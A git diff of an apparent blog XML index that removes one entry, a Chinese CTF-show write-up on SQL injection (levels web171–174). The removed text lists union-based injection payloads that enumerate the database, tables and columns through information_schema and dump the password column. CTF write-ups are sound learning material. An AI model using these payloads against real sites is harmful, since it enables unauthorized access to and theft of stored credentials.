@@ -279,31 +279,6 @@
     
     
     <entry>
-      <title>CTF-show-SQL注入-1</title>
-      <link href="/2022/03/01/CTF-show-SQL%E6%B3%A8%E5%85%A5-1/"/>
-      <url>/2022/03/01/CTF-show-SQL%E6%B3%A8%E5%85%A5-1/</url>
-      
-        <content type="html"><![CDATA[<p>From：</p><p><a href="https://blog.csdn.net/qq_61237064/article/details/121421239">https://blog.csdn.net/qq_61237064/article/details/121421239</a></p><p><a href="https://blog.csdn.net/weixin_48083470/article/details/119034415">https://blog.csdn.net/weixin_48083470/article/details/119034415</a></p><h3 id="1、web171"><a href="#1、web171" class="headerlink" title="1、web171"></a>1、web171</h3><img src="https://gitee.com/mie1732/emc/raw/master/img/202203010825363.png"  /><p>在网页中给出的用户表中可以看到ID=3后，数据无法显示，这说明有三个字段数</p><p>判断字段后，首先查询数据库名字： <code>ctfshow_web</code></p><p><code>1&#39; union select 1,2,database()--+</code></p><p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203010831630.png" alt="数据库的信息收集"></p><p>得到数据库后查询<code>ctfshow_web</code>中的表名： <code>ctfshow_user</code></p><p><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow_web&#39;--+</code></p><p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203010841926.png" alt="表名"></p><p>得到表名后查询 <code>ctfshow_user</code>里的所有列名：<code>id,username,password</code></p><p><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_user&#39;--+</code></p><p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203010847832.png" alt="列名"></p><p>查询列名password中的数据即可：</p><p><code>1&#39; union select 1,2,group_concat(password) from ctfshow_user--+</code></p><p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203010851191.png" alt="password"></p><h3 id="2、web172"><a href="#2、web172" class="headerlink" title="2、web172"></a>2、web172</h3><p>同web171</p><h3 id="3、web173"><a href="#3、web173" class="headerlink" title="3、web173"></a>3、web173</h3><p>同web171</p><h3 id="4、web174"><a href="#4、web174" class="headerlink" title="4、web174"></a>4、web174</h3><p>查看返回逻辑，发现过滤了flag字符和数字，尝试布尔盲注</p><p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203241656770.png" alt="提示"></p><p><code>preg_match</code>执行匹配正则表达式</p><p><code>json_encode</code>对变量进行 JSON 编码</p><p>先抓包查看信息</p><p><img src="C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20220324170326485.png" alt="GET方式"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF-show </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL注入 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>CTF-show-信息收集</title>
       <link href="/2022/03/01/CTF-show-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
       <url>/2022/03/01/CTF-show-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
